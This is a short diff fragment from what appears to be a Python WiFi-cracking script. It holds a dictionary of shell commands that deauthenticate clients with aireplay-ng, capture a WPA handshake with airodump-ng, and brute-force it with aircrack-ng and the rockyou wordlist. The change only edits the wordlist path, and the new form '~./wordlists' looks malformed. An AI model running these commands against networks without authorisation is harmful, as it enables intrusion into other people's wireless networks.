@@ -11,7 +11,7 @@ command = {
     "restartNetworkManager" : "sudo systemctl restart NetworkManager",
     "deAuth" : "sudo aireplay-ng --deauth 5 -a {bssid} {interface}mon",
     "handShake" : "sudo airodump-ng --bssid {bssid} -c {channel} --write {cap_file} --output-format cap {interface}mon",
-    "bruteForce" : "sudo aircrack-ng -w ./wordlists/rockyou.txt {cap_file}"
+    "bruteForce" : "sudo aircrack-ng -w ~./wordlists/rockyou.txt {cap_file}"
 }
 
 def monitorMode():
